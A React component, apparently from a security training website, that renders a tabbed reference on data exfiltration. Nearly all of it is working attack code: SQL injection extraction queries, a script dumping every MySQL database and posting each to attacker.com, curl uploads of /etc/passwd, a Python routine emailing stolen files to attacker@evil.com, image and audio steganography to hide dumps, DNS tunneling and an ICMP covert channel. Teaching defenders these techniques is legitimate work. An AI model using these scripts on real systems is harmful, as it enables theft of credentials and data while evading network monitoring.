
import React from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/components/ui/tabs';
import { Download, Database, Globe, FileText } from 'lucide-react';
import CodeExample from '@/components/CodeExample';

const DataExfiltration: React.FC = () => {
  return (
    <Card className="bg-cybr-card border-cybr-muted">
      <CardHeader>
        <CardTitle className="text-cybr-primary flex items-center gap-2">
          <Download className="h-6 w-6" />
          Data Exfiltration
        </CardTitle>
      </CardHeader>
      <CardContent className="space-y-6">
        <Tabs defaultValue="database-dump" className="w-full">
          <TabsList className="grid grid-cols-4 w-full">
            <TabsTrigger value="database-dump">Database</TabsTrigger>
            <TabsTrigger value="file-exfiltration">Files</TabsTrigger>
            <TabsTrigger value="steganography">Steganography</TabsTrigger>
            <TabsTrigger value="dns-exfiltration">DNS</TabsTrigger>
          </TabsList>

          <TabsContent value="database-dump" className="space-y-4">
            <h3 className="text-xl font-semibold text-cybr-primary">Database Exfiltration</h3>
            
            <div className="space-y-4">
              <h4 className="text-lg font-medium text-cybr-secondary">SQL Injection Data Extraction</h4>
              <CodeExample
                language="sql"
                title="Automated Database Dumping"
                code={`-- MySQL Database Dumping
-- Get database names
SELECT schema_name FROM information_schema.schemata;

-- Get table names
SELECT table_name FROM information_schema.tables WHERE table_schema='database_name';

-- Get column names
SELECT column_name FROM information_schema.columns WHERE table_name='users';

-- Extract data with UNION
SELECT username,password FROM users UNION SELECT table_name,'' FROM information_schema.tables;

-- Blind SQL injection data extraction
SELECT SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1);

-- Boolean-based extraction
SELECT * FROM products WHERE id=1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>65;`}
              />

              <h4 className="text-lg font-medium text-cybr-secondary">Direct Database Access</h4>
              <CodeExample
                language="bash"
                title="Database Dump Commands"
                code={`# MySQL dump
mysqldump -u root -p --all-databases > all_databases.sql
mysqldump -u root -p database_name > database_dump.sql

# PostgreSQL dump
pg_dump -U postgres database_name > database_dump.sql
pg_dumpall -U postgres > all_databases.sql

# MongoDB dump
mongodump --host localhost --port 27017 --out /backup/
mongoexport --db database_name --collection users --out users.json

# Automated exfiltration script
#!/bin/bash
for db in $(mysql -u root -p -e "SHOW DATABASES;" | grep -v Database | grep -v information_schema | grep -v mysql | grep -v performance_schema); do
    mysqldump -u root -p $db > $db.sql
    curl -X POST -F "file=@$db.sql" http://attacker.com/upload
    rm $db.sql
done`}
              />
            </div>
          </TabsContent>

          <TabsContent value="file-exfiltration" className="space-y-4">
            <h3 className="text-xl font-semibold text-cybr-primary">File Exfiltration</h3>
            
            <div className="space-y-4">
              <h4 className="text-lg font-medium text-cybr-secondary">HTTP/HTTPS Exfiltration</h4>
              <CodeExample
                language="bash"
                title="File Upload Techniques"
                code={`# Simple file upload
curl -X POST -F "file=@/etc/passwd" http://attacker.com/upload

# Base64 encoded upload
cat /etc/passwd | base64 | curl -X POST -d @- http://attacker.com/data

# Chunked upload for large files
split -b 1M sensitive_data.zip chunk_
for chunk in chunk_*; do
    curl -X POST -F "file=@$chunk" http://attacker.com/upload
done

# Steganographic upload
steghide embed -cf image.jpg -ef secret.txt -p password
curl -X POST -F "image=@image.jpg" http://attacker.com/upload

# Using legitimate services
# Google Drive API
curl -X POST -H "Authorization: Bearer ACCESS_TOKEN" \
     -F "metadata={name :'secret.txt'}" \
     -F "file=@secret.txt" \
     https://www.googleapis.com/upload/drive/v3/files`}
              />

              <h4 className="text-lg font-medium text-cybr-secondary">Email Exfiltration</h4>
              <CodeExample
                language="python"
                title="Email-based Data Exfiltration"
                code={`import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os

def exfiltrate_via_email(file_path, email_user, email_pass):
    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = "attacker@evil.com"
    msg['Subject'] = "System Report"
    
    # Add file as attachment
    with open(file_path, "rb") as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
    
    encoders.encode_base64(part)
    part.add_header(
        'Content-Disposition',
        f'attachment; filename= {os.path.basename(file_path)}'
    )
    
    msg.attach(part)
    
    # Send email
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email_user, email_pass)
    text = msg.as_string()
    server.sendmail(email_user, "attacker@evil.com", text)
    server.quit()

# Usage
exfiltrate_via_email("/etc/passwd", "victim@company.com", "password123")`}
              />
            </div>
          </TabsContent>

          <TabsContent value="steganography" className="space-y-4">
            <h3 className="text-xl font-semibold text-cybr-primary">Steganographic Exfiltration</h3>
            
            <div className="space-y-4">
              <h4 className="text-lg font-medium text-cybr-secondary">Image Steganography</h4>
              <CodeExample
                language="python"
                title="LSB Steganography"
                code={`from PIL import Image
import binascii

def hide_data_in_image(image_path, data, output_path):
    """Hide data in image using LSB steganography"""
    img = Image.open(image_path)
    encoded_data = data + "####"  # Delimiter
    binary_data = ''.join(format(ord(char), '08b') for char in encoded_data)
    
    pixels = list(img.getdata())
    data_index = 0
    
    for i in range(len(pixels)):
        if data_index < len(binary_data):
            # Modify LSB of red channel
            r, g, b = pixels[i]
            r = r & 0xFE | int(binary_data[data_index])
            pixels[i] = (r, g, b)
            data_index += 1
    
    img.putdata(pixels)
    img.save(output_path)

# Hide sensitive data in image
sensitive_data = open('/etc/passwd').read()
hide_data_in_image('normal.jpg', sensitive_data, 'output.jpg')

# Upload to social media or image hosting
# Data remains hidden in plain sight`}
              />

              <h4 className="text-lg font-medium text-cybr-secondary">Audio Steganography</h4>
              <CodeExample
                language="python"
                title="Audio Data Hiding"
                code={`import wave
import numpy as np

def hide_in_audio(audio_file, data, output_file):
    """Hide data in audio file using LSB"""
    # Read audio file
    with wave.open(audio_file, 'rb') as audio:
        frames = audio.readframes(-1)
        sound_info = audio.getparams()
    
    # Convert to numpy array
    audio_data = np.frombuffer(frames, dtype=np.int16)
    
    # Convert data to binary
    binary_data = ''.join(format(ord(char), '08b') for char in data)
    binary_data += '1111111111111110'  # End marker
    
    # Hide data in LSB
    for i, bit in enumerate(binary_data):
        if i < len(audio_data):
            audio_data[i] = (audio_data[i] & 0xFFFE) | int(bit)
    
    # Save modified audio
    with wave.open(output_file, 'wb') as output:
        output.setparams(sound_info)
        output.writeframes(audio_data.tobytes())

# Hide database dump in audio file
db_dump = open('database_dump.sql').read()
hide_in_audio('music.wav', db_dump, 'music_with_data.wav')`}
              />
            </div>
          </TabsContent>

          <TabsContent value="dns-exfiltration" className="space-y-4">
            <h3 className="text-xl font-semibold text-cybr-primary">DNS Exfiltration</h3>
            
            <div className="space-y-4">
              <h4 className="text-lg font-medium text-cybr-secondary">DNS Tunneling</h4>
              <CodeExample
                language="python"
                title="DNS Data Exfiltration"
                code={`import socket
import base64
import time

def dns_exfiltrate(data, domain):
    """Exfiltrate data via DNS queries"""
    # Encode data to base64
    encoded_data = base64.b64encode(data.encode()).decode()
    
    # Split into DNS-safe chunks (max 63 chars per label)
    chunk_size = 50
    chunks = [encoded_data[i:i+chunk_size] for i in range(0, len(encoded_data), chunk_size)]
    
    for i, chunk in enumerate(chunks):
        # Create DNS query
        query = f"{i}.{chunk}.{domain}"
        try:
            socket.gethostbyname(query)
        except:
            pass  # DNS query fails but server logs the request
        time.sleep(0.1)  # Avoid rate limiting

# Exfiltrate sensitive data
sensitive_data = open('/etc/passwd').read()
dns_exfiltrate(sensitive_data, "attacker.com")

# Server-side DNS log analysis
# tail -f /var/log/bind/query.log | grep attacker.com`}
              />

              <h4 className="text-lg font-medium text-cybr-secondary">ICMP Exfiltration</h4>
              <CodeExample
                language="bash"
                title="ICMP Covert Channel"
                code={`#!/bin/bash
# ICMP data exfiltration script

FILE_TO_EXFILTRATE="/etc/passwd"
ATTACKER_IP="192.168.1.100"

# Encode file in base64 and split into chunks
base64 $FILE_TO_EXFILTRATE | split -b 32 - chunk_

# Send each chunk via ICMP
for chunk in chunk_*; do
    DATA=$(cat $chunk)
    # Embed data in ICMP payload
    ping -c 1 -p $(echo -n $DATA | hexdump -v -e '/1 "%02x"') $ATTACKER_IP
    sleep 1
done

# Cleanup
rm chunk_*

# Receiving side (on attacker machine)
# tcpdump -i eth0 icmp and src $VICTIM_IP -w icmp_data.pcap
# Extract data from ICMP payload for reconstruction`}
              />
            </div>
          </TabsContent>
        </Tabs>
      </CardContent>
    </Card>
  );
};

export default DataExfiltration;
